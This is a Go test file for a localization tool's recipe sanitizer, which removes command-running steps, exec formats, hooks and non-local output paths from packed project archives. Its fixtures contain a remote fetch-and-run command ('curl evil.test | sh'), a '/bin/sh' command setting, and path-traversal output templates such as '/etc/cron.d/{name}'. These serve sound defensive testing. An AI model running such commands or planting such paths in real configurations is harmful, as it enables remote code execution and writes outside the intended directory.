package kpz

import (
	"testing"

	"github.com/neokapi/neokapi/core/flow"
	"github.com/neokapi/neokapi/core/model"
	"github.com/neokapi/neokapi/core/project"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v3"
)

// sampleRecipe builds a full project recipe with flows, defaults, and
// side-effecting Extras (server/hooks) plus an inert custom extra.
func sampleRecipe(t *testing.T) *project.KapiProject {
	t.Helper()
	r := &project.KapiProject{
		Version: project.CurrentVersion,
		Name:    "demo",
		Defaults: project.Defaults{
			SourceLanguage:  "en-US",
			TargetLanguages: []model.LocaleID{"fr-FR", "de-DE"},
		},
		Flows: map[string]*flow.StepsSpec{
			"translate": {Steps: []flow.FlowStep{{Tool: "translate"}}},
		},
	}
	// Side-effecting Extras that SanitizeRecipe must strip.
	for _, k := range []string{"server", "hooks", "automations"} {
		var n yaml.Node
		require.NoError(t, n.Encode(map[string]any{"url": "https://example.test"}))
		if r.Extras == nil {
			r.Extras = map[string]yaml.Node{}
		}
		r.Extras[k] = n
	}
	// An inert custom extra that must survive.
	var keep yaml.Node
	require.NoError(t, keep.Encode(map[string]any{"flavor": "vanilla"}))
	r.Extras["custom"] = keep
	return r
}

// TestRecipeRoundTrip verifies the full recipe (flows + defaults) survives a
// pack/unpack, while side-effecting Extras are stripped by SanitizeRecipe and
// inert Extras travel.
func TestRecipeRoundTrip(t *testing.T) {
	recipe, removed := SanitizeRecipe(sampleRecipe(t))
	assert.Len(t, removed, 3, "the three side-effecting Extras are reported, not dropped silently")
	require.NotContains(t, recipe.Extras, "server")
	require.NotContains(t, recipe.Extras, "hooks")
	require.NotContains(t, recipe.Extras, "automations")
	require.Contains(t, recipe.Extras, "custom")

	pkg := &Package{Recipe: recipe, Overlays: sampleOverlays()}
	data, err := pkg.Marshal()
	require.NoError(t, err)
	got, err := Unmarshal(data)
	require.NoError(t, err)

	require.NotNil(t, got.Recipe)
	assert.Equal(t, "demo", got.Recipe.Name)
	assert.Equal(t, model.LocaleID("en-US"), got.Recipe.Defaults.SourceLanguage)
	assert.Equal(t, []model.LocaleID{"fr-FR", "de-DE"}, got.Recipe.Defaults.TargetLanguages)
	require.Contains(t, got.Recipe.Flows, "translate")
	require.Len(t, got.Recipe.Flows["translate"].Steps, 1)
	assert.Equal(t, "translate", got.Recipe.Flows["translate"].Steps[0].Tool)

	// Inert extra survived; side-effecting ones did not.
	assert.Contains(t, got.Recipe.Extras, "custom")
	assert.NotContains(t, got.Recipe.Extras, "server")
	assert.NotContains(t, got.Recipe.Extras, "hooks")
	assert.NotContains(t, got.Recipe.Extras, "automations")
}

// TestRecipeNotInRootHash verifies the recipe is manifest metadata: a package's
// content RootHash is identical whether the recipe is nil or set.
func TestRecipeNotInRootHash(t *testing.T) {
	sanitized, _ := SanitizeRecipe(sampleRecipe(t))
	withRecipe := &Package{Recipe: sanitized, Overlays: sampleOverlays()}
	noRecipe := &Package{Overlays: sampleOverlays()}

	r1, err := withRecipe.RootHash()
	require.NoError(t, err)
	r2, err := noRecipe.RootHash()
	require.NoError(t, err)
	assert.Equal(t, r2, r1, "recipe must not affect the content RootHash")
}

// TestSanitizeRecipeNil verifies SanitizeRecipe handles nil.
func TestSanitizeRecipeNil(t *testing.T) {
	got, removed := SanitizeRecipe(nil)
	assert.Nil(t, got)
	assert.Empty(t, removed)
}

// TestSanitizeRecipeLeavesTheCallersRecipeAlone: SanitizeRecipe returns a copy,
// and a shallow struct copy would alias every map and slice — so sanitizing the
// recipe kapi is about to PACK must not quietly edit the project's own loaded
// recipe in the same process.
func TestSanitizeRecipeLeavesTheCallersRecipeAlone(t *testing.T) {
	original := sampleRecipe(t)
	original.Flows["build"] = &flow.StepsSpec{Steps: []flow.FlowStep{
		{Tool: "external-command"},
		{Tool: "translate"},
	}}
	original.Defaults.Tools = map[string]map[string]any{
		"external-command": {"command": "/bin/sh"},
		"translate":        {"engine": "ai"},
	}

	got, removed := SanitizeRecipe(original)
	assert.NotEmpty(t, removed)

	require.Len(t, got.Flows["build"].Steps, 1, "the exec-class step is gone from the copy")
	assert.Equal(t, "translate", got.Flows["build"].Steps[0].Tool)
	assert.NotContains(t, got.Defaults.Tools, "external-command")

	require.Len(t, original.Flows["build"].Steps, 2, "the caller's recipe is untouched")
	assert.Contains(t, original.Extras, "server", "the caller's Extras are untouched")
	assert.Contains(t, original.Defaults.Tools, "external-command")
}

// TestSanitizeRecipeStripsExecClassSteps: a .kpz recipe is authored by whoever
// packed the archive, so a step that runs a command it names cannot survive
// into a project that adopts it — including one hidden in a nested `parallel`
// branch or in source_transforms.
func TestSanitizeRecipeStripsExecClassSteps(t *testing.T) {
	r := &project.KapiProject{
		Version: project.CurrentVersion,
		Flows: map[string]*flow.StepsSpec{
			"nested": {
				Steps: []flow.FlowStep{{
					Tool: "translate",
					Parallel: []flow.FlowStep{
						{Tool: "external-command"},
						{Tool: "term-check"},
						{Tool: "script", Parallel: []flow.FlowStep{{Tool: "external-command"}}},
					},
				}},
				SourceTransforms: []flow.FlowStep{{Tool: "script"}},
			},
		},
	}

	got, removed := SanitizeRecipe(r)
	assert.Len(t, removed, 3, "both parallel branches and the source transform are reported")

	spec := got.Flows["nested"]
	require.Len(t, spec.Steps, 1)
	assert.Equal(t, "translate", spec.Steps[0].Tool)
	require.Len(t, spec.Steps[0].Parallel, 1, "the nested exec-class steps are gone")
	assert.Equal(t, "term-check", spec.Steps[0].Parallel[0].Tool)
	assert.Empty(t, spec.SourceTransforms)
}

// TestSanitizeRecipeStripsExecFormat: the `exec` format reads content by
// spawning the command line its config names, which is the same capability as
// an exec-class step wearing a different hat.
func TestSanitizeRecipeStripsExecFormat(t *testing.T) {
	r := &project.KapiProject{
		Version: project.CurrentVersion,
		Content: []project.ContentCollection{{
			Path:   "src/**/*.tsx",
			Format: &project.FormatSpec{Name: "exec", Config: map[string]any{"command": "curl evil.test | sh"}},
			Items: []project.ContentItem{{
				Path:   "other/**/*.json",
				Format: &project.FormatSpec{Name: "exec"},
			}},
		}},
	}

	got, removed := SanitizeRecipe(r)
	assert.Len(t, removed, 2)
	assert.Nil(t, got.Content[0].Format, "the collection keeps its paths but not the exec binding")
	assert.Nil(t, got.Content[0].Items[0].Format)
	assert.Equal(t, "src/**/*.tsx", got.Content[0].Path, "the content itself is still described")
}

// TestSanitizeRecipeClearsNonLocalOut: the out layout is where merge writes, and
// it travels inside the package. A template naming somewhere absolute or above
// the merge directory is dropped back to the default per-locale layout.
func TestSanitizeRecipeClearsNonLocalOut(t *testing.T) {
	for _, tc := range []struct {
		name, out string
		wantLocal bool
	}{
		{"conventional", "l10n/{lang}/{name}.{ext}", true},
		{"bare directory", "out", true},
		{"nested placeholders", "{dir}/{lang}/{name}.{ext}", true},
		{"absolute", "/etc/cron.d/{name}", false},
		{"climbing", "../../../../{lang}", false},
		{"climbing through a placeholder segment", "l10n/../../../{lang}", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.wantLocal, IsLocalOutTemplate(tc.out))

			r := &project.KapiProject{Version: project.CurrentVersion}
			require.NoError(t, SetRecipeWorkspaceMeta(r, WorkspaceMeta{Out: tc.out, Workspace: true}))
			got, removed := SanitizeRecipe(r)

			meta := RecipeWorkspaceMeta(got)
			if tc.wantLocal {
				assert.Equal(t, tc.out, meta.Out, "a legitimate layout must survive")
				assert.Empty(t, removed)
			} else {
				assert.Empty(t, meta.Out, "a non-local layout falls back to the default")
				assert.Len(t, removed, 1)
			}
			assert.True(t, meta.Workspace, "the workspace marker is not collateral damage")
		})
	}
}

// TestWorkspaceMetaRoundTrip verifies the kpz workspace Extras (output layout +
// workspace marker) round-trip through the recipe.
func TestWorkspaceMetaRoundTrip(t *testing.T) {
	r := &project.KapiProject{Version: project.CurrentVersion}
	require.NoError(t, SetRecipeWorkspaceMeta(r, WorkspaceMeta{Out: "l10n/{lang}/{name}.{ext}", Workspace: true}))

	pkg := &Package{Recipe: r, Overlays: sampleOverlays()}
	data, err := pkg.Marshal()
	require.NoError(t, err)
	got, err := Unmarshal(data)
	require.NoError(t, err)

	meta := RecipeWorkspaceMeta(got.Recipe)
	assert.Equal(t, "l10n/{lang}/{name}.{ext}", meta.Out)
	assert.True(t, meta.Workspace)
}
